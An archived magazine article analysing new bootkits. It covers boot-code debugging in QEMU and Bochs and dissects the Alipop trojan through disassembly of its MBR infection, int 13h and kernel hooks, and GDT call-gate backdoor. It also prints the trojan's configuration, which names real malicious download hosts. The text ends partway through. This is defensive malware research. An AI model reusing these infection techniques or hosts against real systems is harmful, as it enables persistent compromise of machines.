<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/ga.js"></script><script src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app202.us.archive.org';v.server_ms=318;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://www.nobunkum.ru:80/analytics/en-mbr-infectors","20180310110809","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1520680089");
</script>
<link rel="stylesheet" type="text/css" href="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Bootkits – a new stage of development</title>
  <!-- base href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/rss">
  <link rel="stylesheet" type="text/css" href="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180310110809/http://www.nobunkum.ru:80/analytics/en-mbr-infectors</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://www.nobunkum.ru/analytics/en-mbr-infectors","20180310110809",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li class="current"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <!-- http://www.nobunkum.org/mbr-infectors/index.html  -->
<div style="margin-top: -10px;">
<h1>Bootkits – a new stage of development</h1>
<p class="author">Dmitry Oleksyuk<br>Senior Researcher, Esage Lab<br><a href="https://web.archive.org/web/20180310110809/mailto:dmitry@esagelab.com">dmitry@esagelab.com</a></p>
<ul class="toc">
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s1">Technical tools for bootkit analysis</a>
<ul>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s2">Debugging via QEMU</a></li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s3">Debugging via Bochs</a></li>
</ul>
</li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s4">Analysis of new bootkits</a>
<ul>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s5">Backdoor.Win32.Trup.a (Alipop)</a></li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s6">Mebratix.b (Ghost Shadow)</a></li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s7">Black Internet Trojan</a></li>
</ul>
</li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s8">Conclusion</a></li>
<li><a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/analytics/en-mbr-infectors#s9">About the author</a></li>
</ul>
<p><strong>Bootkits</strong> are malicious programs that take control of
 the computer by infecting the hard disk’s main boot record (MBR) before
 the operating system loads.</p>
<p>The first malicious bootkit ever detected was called Sinowal or 
Mebroot. It appeared in 2007 and was rather innovative for that time. 
But, for whatever reason, malicious codes developers failed to warm up 
to this particular infection technique, and for three years we have 
practically seen no new bootkits.</p>
<div class="aside">
<h4>The article is also available in <a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/ru/mbr-infectors">Russian</a></h4>
</div>
<p>But several malicious bootkits appeared recently, signaling perhaps 
that this particular technique is finally on its way of becoming 
popular.</p>
<div class="aside">
<p>Derek Soeder, Ryan Permeh. <a href="https://web.archive.org/web/20180310110809/http://www.blackhat.com/presentations/bh-usa-05/bh-us-05-soeder.pdf">eEye BootRoot: A Basis for Bootstrap-Based Windows Kernel Code</a>.</p>
</div>
<p>This article reviews new bootkits classes. Particular focus has been 
put on the principle of boot code working, because this issue was ever 
only considered in a 20o5 report about the concept of eEye BootRoot 
technology.</p>
<h2 id="s1">Technical tools for bootkit analysis</h2>
<p>A bootkit’s code is impossible to analyze with your typical kernel 
mode debuggers, since it is executed before the control is transferred 
from BIOS to the boot sector. The debugging of boot code is possible 
only via virtual machines with executable code debugging capabilities, 
and at the moment such functionality is available on QEMU and Bochs 
virtual machines.</p>
<h3 id="s2">Debugging via QEMU</h3>
<div class="aside">
<p><a href="https://web.archive.org/web/20180310110809/http://wiki.qemu.org/download/qemu-doc.html#gdb_005fusage">QEMU Emulator User Documentation. 3.11 GDB usage</a>.</p>
</div>
<p><a href="https://web.archive.org/web/20180310110809/http://wiki.qemu.org/Main_Page">QEMU</a>
 — Free open source software. Its functionality includes emulation of 
x86, x86-64 and other CPUs, and emulation of I/O devices. It is possible
 to debug emulated code with a <a href="https://web.archive.org/web/20180310110809/http://www.gnu.org/software/gdb/">GDB</a> debugger, as it’s thoroughly described in QEMU documentation.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/gdb.jpg" alt="Fig. 1. Using GDB along with QEMU." width="668" height="331">
<p>Fig. 1. Using GDB along with QEMU.</p>
</div>
<div class="aside">
<p><a href="https://web.archive.org/web/20180310110809/http://www.hex-rays.com/idapro/debugger/gdb_qemu.pdf">Using IDA's GDB debugger with QEMU emulator</a>.</p>
</div>
<p>It is the author’s opinion that it’s better to use the debugger of <a href="https://web.archive.org/web/20180310110809/http://www.idapro.ru/index.php">IDA Pro</a> disassembler (from version <a href="https://web.archive.org/web/20180310110809/http://www.hex-rays.com/products/ida/5.4/index.shtml">5.4</a>). Setting up a debugger and a virtual machine is described in IDA Pro documentation</p>
<p>Let’s address some features of boot code debugging.</p>
<p>When the debugger is connected to a virtual machine and a session is 
initialized, it is necessary to set hardware breakpoint to 0000:7C00h 
address, since boot code starts its execution from this address. Then 
open the «Breakpoints» tab and choose «Insert...» from the dropdown 
menu:</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/ida_break.jpg" alt="Add new breakpoint in IDA Pro." width="214" height="336">
<p>Fig. 2. Add new breakpoint in IDA Pro.</p>
</div>
<p>Code execution can be continued (F9) after adding the breakpoint.</p>
<p>Note that it is necessary to edit segment settings manually after 
execution of breakpoint to debug 16-bit code. To do that, open «Edit» 
-&gt; «Segmets» -&gt; «Edit Segment...» in the main menu and set a 
16-bit addressing mode for the current segment:</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/ida_segment.jpg" alt="Настройки сегмента в IDA Pro" width="317" height="403">
<p>Fig. 3. Segment settings in IDA Pro.</p>
</div>
<p>Then you can open the code analysis window and analyze boot sector code.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/ida_debugging.jpg" alt="Debugging of boot code in IDA Pro" width="414" height="441">
<p>Fig. 4. Debugging of boot code in IDA Pro.</p>
</div>
<h3 id="s3">Debugging via Bochs</h3>
<p><a href="https://web.archive.org/web/20180310110809/http://bochs.sourceforge.net/">Bochs</a> - Free open source software. Its functionality includes emulation of x86/x86-64 CPUs and emulation of I/O devices.</p>
<p>Since this system treats each instruction of the virtual CPU, it is 
notable for high emulation precision. For the same reason, Bochs’ 
performance is poorer than that of popular virtual machines like VMware 
and VirtualBox and the above-described QEMU. It is advisable to have an 
image of your hard disk with the installed OS ready prior to starting 
Bochs. You can make such an image with the QEMU emulator.</p>
<p>The Bochs debugger is a standalone application <code>bochsdbg.exe</code>, which shows a dialog window offering the possibility to change virtual machine settings, restore or save its configuration.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/bochs_debugging.jpg" alt="Bochs start menu" width="668" height="331">
<p>Fig. 5. Bochs start menu.</p>
</div>
<p>The starting of the virtual machine is followed by the opening of a 
debugging console with a small but sufficient stack of commands, which 
can be listed by using the «<code>help</code>» command. Enter «<code>lb 0x7c00</code>» to set the breakpoint to the beginning of boot code execution and «<code>c</code>» to continue code execution.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/bochs_debugging.jpg" alt="Code debugging in Bochs" width="668" height="331">
<p>Fig. 6. Code debugging in Bochs.</p>
</div>
<h2 id="s4">Analysis of new bootkits</h2>
<h3 id="s5">Backdoor.Win32.Trup.a (Alipop)</h3>
<p>Alipop appeared around May 2010. Judging by the pop-up ads and the Chinese-language AdWare, its developers are Chinese.</p>
<h4>Self-defense</h4>
<p>This trojan doesn’t use any techniques to avoid proactive defense. 
However, the source code of most of it procedures is secured against 
reverse engineering with an old but effective method. It hides some real
 processor instructions inside long chain of opcodes, which are 
considered by the disassembler as false instruction.</p>
<pre>.text:0040546D                 call    FindFirstFileA
.text:00405473                 cmp     eax, 0FFFFFFFFh
.text:00405476                 jz      short loc_405492
.text:00405478                 jz      near ptr loc_405484+1
.text:0040547E                 jnz     near ptr loc_405484+1
.text:00405484
.text:00405484 loc_405484:
.text:00405484                 call    near ptr 4248F1h
.text:00405489                 add     bh, bh
.text:0040548B                 adc     eax, offset Sleep
.text:00405490                 jmp     short loc_40545F</pre>
<p>The code presented above is executed in this way:</p>
<pre>.text:0040546D                 call    FindFirstFileA
.text:00405473                 cmp     eax, 0FFFFFFFFh
.text:00405476                 jz      short loc_405492
.text:00405478                 jz      loc_405485
.text:0040547E                 jnz     loc_405485
.text:0040547E ; ---------------------------------------------------------------------------
.text:00405484                 db 0E8h
.text:00405485 ; ---------------------------------------------------------------------------
.text:00405485
.text:00405485 loc_405485:
.text:00405485                 push    1F4h
.text:0040548A                 call    Sleep
.text:00405490                 jmp     short loc_40545F</pre>
<p>As you can see from this listing, a 5-byte <code>call</code> instruction at 00405484 doesn’t make any sense because previous calls always pass control to 00405485 where the <code>push</code>
 instruction is located. This method hinders code analysis in the IDA 
disassembler and makes it impossible to decompile code with HexRays 
without pre-processing.</p>
<h4>Installer</h4>
<p>The bootkit’s installer is an executable file of about 24 kB (MD5: <a href="https://web.archive.org/web/20180310110809/http://www.virustotal.com/file-scan/report.html?id=75258e9eccbb3d73ca3f3dc2201319304cda53bb476f763dc87111c6fbb42eed-1277858042">3f5cff08b83a0a9ad5f8e0973b77a2ac</a>), and contains all the other bootkit components.</p>
<p>Executing the installer leads to the creation and launch of the <code>C:\WINDOWS\ali.exe</code> (MD5: <a href="https://web.archive.org/web/20180310110809/http://www.virustotal.com/file-scan/report.html?id=fe637b6f40f88191c4aff00627c4e89eb15e74519bc281164e8cfe9c64b99274-1277859283">570e6e5c1d0c95c5a446f6f62fa90468</a>, about 17 kB) file with the main operation code of the trojan.</p>
<p>To maintain auto-loading, the installer writes the bootkit’s code in the first 40 sectors of the HDD:</p>
<pre>"CreateFile", "\Device\Harddisk0\DR0", "Desired Access: Generic Read/Write, Disposition: Open"
"ReadFile",   "\Device\Harddisk0\DR0", "Offset: 0, Length: 20,480, I/O Flags: Non-cached"
"WriteFile",  "\Device\Harddisk0\DR0", "Offset: 0, Length: 20,480, I/O Flags: Non-cached"
"CloseFile",  "\Device\Harddisk0\DR0"</pre>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/infected_mbr.jpg" alt="Fig. 7. Infected MBR." width="654" height="331">
<p>Fig. 7. Infected MBR.</p>
</div>
<p>The bootkit’s code is called at the next system launch.</p>
<h4>Executable code</h4>
<p>First of all, the bootkit’s executable code reserves 20 kB in the 
base memory. For this purpose it decreases base memory volume in BIOS 
variable at 0040h:0013h. The bootkit’s components are fetched from the 
first 40 HDD sectors into a reserved area with function 2 of interrupt 
13h. Then control is being transferred to fetched code.</p>
<pre>seg000:001F                 pushad
seg000:0021                 push    ds
seg000:0022                 mov     bx, word ptr cs:0413h
seg000:0027                 sub     bx, 14h ; reserve 20 kB of the memory
seg000:002B                 and     bl, 0FCh
seg000:002E                 mov     word ptr cs:0413h, bx
seg000:0033                 shl     bx, 6 ; Calculate line address of reserved sector
seg000:0036                 mov     es, bx
seg000:0038                 xor     bx, bx
seg000:003A                 mov     ax, 228h ; Read first 40 sectors 
seg000:003D                 mov     cx, 1
seg000:0040                 mov     dx, 80h
seg000:0043                 int     13h     
seg000:0045                 push    es
seg000:0046                 push    4Ah ; transfer control to fetched code by 4ah offset
seg000:0049                 retf</pre>
<p>Read code and data from the 83h offset is ciphered with a reversible 
operation ROR, and then deciphering is performed. After deciphering the 
bootkit intercepts BIOS 13h interrupt and makes it possible to control 
read operations at the first stages of system launch. Finally, the 
original OS loader is getting called, which is saved by the bootkit’s 
installer in sector 39.</p>
<pre>seg000:0083                 mov     eax, dword ptr es:004Сh
seg000:0088                 mov     dword ptr cs:00F3h, eax ; Save original int 13h handler
seg000:008D                 and     dword ptr es:004Сh, 0
seg000:0097                 or      word ptr es:004Сh, 0E6h ; Set hew handler address
seg000:009E                 mov     word ptr es:004Eh, cs   ; Set hew handler selector
seg000:00A3                 xor     ebx, ebx
seg000:00A6                 mov     bx, cs
seg000:00A8                 shl     ebx, 4

                            ...                            
                            
seg000:00C5                 mov     di, 7C00h
seg000:00C8                 push    cs
seg000:00C9                 pop     ds
seg000:00CA                 mov     si, 4C00h ; Copy original boot sector to 7C00h
seg000:00CD                 mov     cx, 200h
seg000:00D0                 cld
seg000:00D1                 rep movsb
seg000:00D3                 pop     ds
seg000:00D4                 popad
seg000:00D6                 lss     sp, dword ptr es:0602h  ; Restore sp
seg000:00DC                 mov     es, word ptr es:0600h   ; Restore es
seg000:00E1                 jmp     far ptr 0:7C00h         ; Execute original boot code</pre>
<p>Hooking of 13h interrupt is performed to modify the code of the <code>OSLOADER.EXE</code> module during its reading from system partition. <code>OSLOADER.EXE</code> is a part of the <code>NTLDR</code>
 module, and is executed in protected mode. The goal of this 
modification is to execute the bootkit’s code in protected mode, too. <code>OSLOADER.EXE</code>
 code (subject to modification) is being searched by signature in the 
buffer with fetched data, received after interrupt processing:</p>
<pre>seg000:0120                 mov     di, bx  ; di – pointer to buffer with data
seg000:0122                 mov     al, 8Bh ; first byte of the signature
seg000:0124                 cld
seg000:0125
seg000:0125 loc_125:
seg000:0125                 repne scasb
seg000:0127                 jnz     short loc_159
seg000:0129                 cmp     dword ptr es:[di], 74F685F0h ; bytes 2-5 
seg000:0131                 jnz     short loc_125
seg000:0133                 cmp     word ptr es:[di+4], 8021h ; bytes 6-7 
seg000:0139                 jnz     short loc_125
seg000:013B                 push    es
seg000:013C                 xor     eax, eax
seg000:013F                 mov     es, ax
seg000:0141                 mov     ax, cs
seg000:0143                 shl     eax, 4
seg000:0147                 add     eax, 200h
seg000:014D                 pop     es
seg000:014E                 mov     word ptr es:[di-1], 15FFh ; write instruction call dword ptr [addr]
seg000:0154                 mov     es:[di+1], eax</pre>
<p><code>OSLOADER</code> code is the following set of instructions:</p>
<pre>.text:00422B77                 call    _BlLoadBootDrivers@12
.text:00422B7C                 mov     esi, eax
.text:00422B7E                 test    esi, esi
.text:00422B80                 jz      short loc_422BA3
.text:00422B82
.text:00422B82 loc_422B82: 
.text:00422B82                 cmp     _BlRebootSystem, 0
.text:00422B89                 jz      short loc_422B92</pre>
<p>This fragment refers to the <code>_BlOsLoader@12()</code> function. The bytes being modified go right after function <code>_BlLoadBootDrivers@12()</code> call. This function loads drivers of system services with <code>SERVICE_BOOT_START</code> trigger mode into the memory. Code of modification is a <code>call</code>
 instruction that transfers control to resident bootkit’s code in 
reserved base memory at the 200h offset. Therefore the bootkit’s code 
gets control when the CPU is in 32-bit protected mode.</p>
<h4>Protected mode code</h4>
<p>The bootkit’s protected mode code starts its execution with receiving
 a kernel load address. This address is read from the first record in 
the list of loaded modules. This record is a <code>LDR_DATA_TABLE_ENTRY</code> structure. A pointer to the list of loaded modules can be obtained from the global variable <code>_BlLoaderBlock</code> of the <code>OSLOADER.EXE</code> module. In particular, the <code>_BlLoaderBlock</code> variable contains a pointer to the <code>_LOADER_PARAMETER_BLOCK</code> structure. A copy of this pointer is used as a local variable in the code of the <code>_BlAllocateDataTableEntry@16()</code> function. The bootkit uses signature to find this section of the code.</p>
<p>Moreover, the virtual address of the memory that is used to load <code>NTLDR</code> and other system modules is read from the local variable <code>KdDllBase</code>. Modified function <code>_BlOsLoader@12()</code> refers to this variable by fixed offset from <code>ebp</code>:</p>
<pre>seg001:00000206                 mov     edi, [esp+24h]  ; edi - Value of KdDllBase variable
seg001:0000020A                 and     edi, 0FFF00000h
seg001:00000210                 cld
seg001:00000211                 mov     al, 0C7h ; First byte of the signature to search for _BlLoaderBlock
seg001:00000213 loc_213:
seg001:00000213                 scasb
seg001:00000214                 jnz     short loc_213
seg001:00000216                 cmp     dword ptr [edi], 40003446h ; Other 4 bytes of the signature
seg001:0000021C                 jnz     short loc_213
seg001:0000021E                 mov     al, 0A1h
seg001:00000220 loc_220: 
seg001:00000220                 scasb
seg001:00000221                 jnz     short loc_220
seg001:00000223                 mov     esi, [edi]      ; esi - pointer to the list of loaded modules
seg001:00000225                 mov     esi, [esi]      ; esi - pointer to the first _LDR_DATA_TABLE_ENTRY
seg001:00000227                 lodsd
seg001:00000228                 mov     ebx, [eax+18h]  ; ebx - kernel load address
seg001:0000022B                 call    sub_267</pre>
<p>The procedure <code>sub_267</code> is used to intercept the kernel function <code>nt!IoGetCurrentProcess()</code>
 in such a way that its call will transfer control to the bootkit’s code
 of the next (third) stage, which has to be executed in 32-byte 
protected mode after OS kernel initialization.</p>
<pre>seg001:00000267                 pop     esi ; Get bootkit’s code address by return address
seg001:00000268                 mov     ecx, 37h
seg001:0000026D                 mov     [esi+2B6h], ebx
seg001:00000273                 lea     edi, [ebx+40h]
seg001:00000276                 mov     ebp, edi
seg001:00000278                 rep movsb   ; Copy bootkit’s code by offset 0x230-0x267 in the header of kernel image over DOS stub
seg001:0000027A                 push    0CE8C3177h     
seg001:0000027F                 call    GetProcByHash  ; Get IoGetCurrentProcess address by a hash of the name
seg001:00000284                 xchg    eax, esi
seg001:00000285                 sub     edi, 0Ah
seg001:0000028B                 movsd  ; Save first 5 bytes of the function
seg001:0000028C                 sub     edi, 6
seg001:00000292                 movsb
seg001:00000293                 mov     byte ptr [esi-5], 0E8h
seg001:00000297                 sub     ebp, esi
seg001:00000299                 mov     [esi-4], ebp ; Patching Modification of IoGetCurrentProcess by its call at nt+0x40 address</pre>
<p>The first call of the <code>nt!IoGetCurrentProcess()</code> function is usually performed after kernel initialization with the <code>nt!Phase1Initialization()</code> function:</p>
<pre>kd&gt; kb
ChildEBP RetAddr  Args to Child  
f9dc35f0 80688d7e 8198c338 8008ecb8 8008ecb8 nt+0x40
f9dc3630 8068ac22 8198c3ec 8008ecb8 0000000c nt!IopInitializeBuiltinDriver+0x260
f9dc3694 80687b48 80082000 f9dc36b0 00034000 nt!IopInitializeBootDrivers+0x2d2
f9dc383c 80685fdd 80082000 00000000 819cc538 nt!IoInitSystem+0x712
f9dc3dac 805c6160 80082000 00000000 00000000 nt!Phase1Initialization+0x9b5
f9dc3ddc 80541dd2 80685628 80082000 00000000 nt!PspSystemThreadStartup+0x34
00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16

kd&gt; u nt!IoGetCurrentProcess
nt!IoGetCurrentProcess:
804ee608 e8338afeff      call    <strong>nt+0x40 (804d7040)</strong>
804ee60d 008b4044c3cc    add     byte ptr [ebx-333CBBC0h],cl
804ee613 cc              int     3
804ee614 cc              int     3
804ee615 cc              int     3
804ee616 cc              int     3
804ee617 cc              int     3</pre>
<h4>Bootkit execution after kernel initialization</h4>
<!-- <div class="aside"><p><strong>«Полезная нагрузка»</strong> — часть кода трояна, выполняющая основную работу, в отличие от служебного кода вредоносной программы, который обеспечивает инсталляцию, функционирование и самозащиту трояна.</p></div> -->
<p>The Hook handler <code>nt!IoGetCurrentProcess()</code> restores the original code of the function and calls <code>nt!PsCreateSystemThread()</code> to launch the system thread which executes the bootkit’s operational code. The operational code performs following:</p>
<ol>
<li>Creates a string parameter in the registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>, with value «<code>C:\WINDOWS\ali.exe</code>» to make it possible to launch the trojan after the system launch.</li>
<li>Creates <code>C:\WINDOWS\ali.exe</code> file. Its content is written into the system from sector 4 of the HDD by the installer during the bootkit installation.</li>
<li>Installs <a href="https://web.archive.org/web/20180310110809/http://www.rsdn.ru/article/asm/driverholes.xml">GDT call gate</a>, which makes it possible to execute any instructions with maximum priority by any user mode code.</li>
</ol><!-- <div class="aside"><p>Дмитрий Олексюк. <a href="http://www.rsdn.ru/article/asm/driverholes.xml#ECEAE">Уязвимости в драйверах режима ядра для Windows</a>.</p></div>
 -->
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/gdt_backdoor.jpg" alt="Fig. 8. GDT call gate (backdoor)." width="414" height="98">
<p>Fig. 8. GDT call gate (backdoor).</p>
</div>
<p>Therefore Alipop developers gave up on using traditional method of 
utilizing a kernel mode driver to execute privileged instructions. 
Instead, they used a trick which allowed them to utilize a user mode 
process for the same goal. This is a simpler but less stealthy approach.
 Also, it is possible that this bootkit was developed as a universal 
tool for execution of any malicious software which runs in user mode 
from the boot sector.</p>
<h4>Trojan process</h4>
<p>The main goal of the <code>ali.exe</code> process is to receive 
commands to download and launch other malicious software from the 
server. Sending HTTP requests is performed via Internet Explorer, which 
is launched in a hidden window.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/process.jpg" alt="Fig. 9. Trojan process." width="384" height="132">
<p>Fig. 9. Trojan process.</p>
</div>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/http_request.jpg" alt="Fig. 10. Request configuration file from server." width="681" height="314">
<p>Fig. 10. Request configuration file from server.</p>
</div>
<p>The trojan’s ciphered configuration file is downloaded from a server with the fixed address <code>http://list.577q.com/sms/xxx.ini</code> and is saved in the <code>C:\WINDOWS</code> catalog with the <code>win.ini</code> name.</p>
<p>An example of configuration file content:</p>
<pre>[DownLoad]
exe1=coopen_setup_100201.exe-8.0|http://download.coopen.cn/setup/v5/coopen_setup_100201.exe
exe2=pptv(pplive)jixian_113459_s.exe-1.0|http://60.173.10.28:4321/pptv(pplive)jixian_113459_s.exe
[ad]
ad1=12
[HomePage]
home=http://www.67ku.com
[Time]
DownLoadIniTime=120
PopAdTime=2
